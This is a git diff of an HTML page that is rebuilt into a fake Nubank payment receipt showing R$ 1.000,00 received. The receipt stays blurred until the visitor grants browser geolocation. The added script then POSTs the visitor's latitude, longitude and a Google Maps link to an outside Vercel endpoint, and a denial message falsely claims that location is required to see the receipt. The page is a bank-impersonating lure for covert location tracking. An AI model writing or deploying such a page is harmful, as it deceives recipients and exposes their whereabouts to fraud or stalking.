@@ -13,18 +13,56 @@
 
 <body style="background-color: #6B02A3">
 
-  <h1>Teste</h1>
-  <p id="data-atual"></p>  <!-- Aqui vai aparecer a data atual -->
 
+
+  <div class="comprovante-container">
+    <h1>Comprovante Nubank</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">comprovante em PDF</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+
+  </div>
+
+  <div class="modal-overlay" id="popup-localizacao">
+    <div class="modal">
+      <p>Precisamos da sua localização para mostrar opções mais próximas de você.</p>
+      <button onclick="pedirLocalizacao()">Permitir Localização</button>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="popup-negado" style="display: none;">
+    <div class="modal">
+      <p>A localização é obrigatória para ver o comprovante.<br>Reinicie a página e permita o acesso.</p>
+    </div>
+  </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
+
+    const container = document.querySelector('.comprovante-container');
+    container.classList.add('blur');
+
+    function removeBlur() {
+      container.classList.remove('blur');
+    }
+
+    function pedirLocalizacao() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+    } else {
+      alert("Geolocalização não é suportada neste navegador.");
+    }
+  }
 
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
@@ -35,34 +73,36 @@
 
     document.getElementById("data-atual").textContent = dataFormatada;
 
-    console.log(dataAtual)
-
     function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("https://comprovantenubank-nunegocios-2iy0chqoj-peterabenzas-projects.vercel.app/api/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
+    fetch("https://comprovantenubank-nunegocios.vercel.app/api/send-location", {
+      method: "POST",
+      headers: {
+      "Content-Type": "application/json"
+    },
+      body: JSON.stringify({ latitude, longitude, maps })
+    })
+    .then(response => {
+      document.getElementById("popup-localizacao").style.display = "none";
+      removeBlur();
+    })
+    .catch(error => {
+      console.error("Erro:", error);
+    });
+  }
 
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
+  function handleError(error) {
+  document.getElementById("popup-localizacao").style.display = "none";
+
+  if (error.code === error.PERMISSION_DENIED) {
+    document.getElementById("popup-negado").style.display = "flex";
+  } else {
+    alert("Erro ao obter a localização: " + error.message);
+  }
+}
   </script>
 </body>
 
